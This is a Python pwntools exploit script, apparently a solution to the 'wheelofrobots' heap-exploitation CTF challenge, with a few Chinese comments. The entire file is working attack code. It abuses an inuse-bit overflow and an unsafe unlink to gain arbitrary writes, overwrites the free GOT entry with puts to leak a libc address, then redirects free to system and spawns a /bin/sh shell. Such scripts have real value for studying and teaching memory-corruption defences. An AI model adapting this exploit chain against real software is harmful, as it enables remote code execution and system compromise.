#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./wheelofrobots1')
libc = ELF('libc.so.6')
p=process('./wheelofrobots1')

def create(robot_num, size):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(robot_num))


    if robot_num == 2:
        p.recvuntil("intelligence: ")
        p.sendline(str(size))
    elif robot_num == 3:
        p.recvuntil("cruelty: ")
        p.sendline(str(size))
    elif robot_num == 6:
        p.recvuntil("powerful: ")
        p.sendline(str(size))

def delete(robot_num):
    p.recvuntil('Your choice : ')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(robot_num))

def change(robot_num, content):
    p.recvuntil('Your choice : ')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(robot_num))
    p.recvuntil("name: \n")
    p.send(content)

def show():
    p.recvuntil('Your choice : ')
    p.sendline('4')

def overflow_inuse(inuse):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline('9999'+str(inuse))

# def happy_write(where, what):
#     change(1, p64(where))
#     change(6, p64(what))

def debug():
    gdb.attach(p)
    pause()

create(2,1)
delete(2)
overflow_inuse('\x01')
change(2,p64(0x603138))

create(3,0x20)# 使 size 为 0x20，绕过检查

create(1,1)

overflow_inuse('\x00')# 要写入字符 '\x00'，而不是 '0'

create(2,1)

delete(1)
delete(3)


create(6,7)# 0xa0

create(3,7)# 0xa0

change(2,p64(0x999))

ptr = 0x6030e8
fd = ptr-0x18
bk = ptr-0x10
payload = flat(
    'a'*0x8,0x90,
    fd,bk,
    'a'*0x70,
    0x90,0xa0
)

change(6,payload)

delete(3)


create(4,0)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
payload = flat(
    'a'*0x10,
    free_got,
    puts_got,
)
change(6,payload)

change(4,p64(puts_plt))

delete(6)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc.address = puts_addr-libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))

change(4,p64(system_addr))
change(2,'/bin/sh\x00')
delete(2)

p.interactive()
